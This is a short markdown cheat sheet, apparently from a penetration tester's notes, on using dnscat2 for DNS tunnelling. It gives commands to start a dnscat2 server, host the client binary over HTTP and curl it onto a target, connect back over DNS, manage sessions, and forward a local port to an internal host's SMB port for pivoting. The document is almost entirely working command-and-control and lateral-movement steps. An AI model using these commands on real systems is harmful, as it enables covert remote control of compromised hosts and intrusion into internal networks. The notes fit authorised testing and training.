---
tags:
  - tool
  - routing
---
# dnscat2

Tunnel over DNS

## Capabilities

```powershell
# Setup a server to listen for connections at the specified domain
dnscat2-server $DOMAIN

# Download the dnscat binary on the target
cp $(which dnscat) .
python3 -m http.server 80

curl 192.168.45.234/dnscat -o dnscat

# Connect to the remote dnscat server
./dnscat $DOMAIN

# Interact with sessions
windows
windows -i 1
?

# Listen for incoming connections on port 4455 and route them to 172.16.2.11:445
listen 127.0.0.1:4455 172.16.2.11:445
```
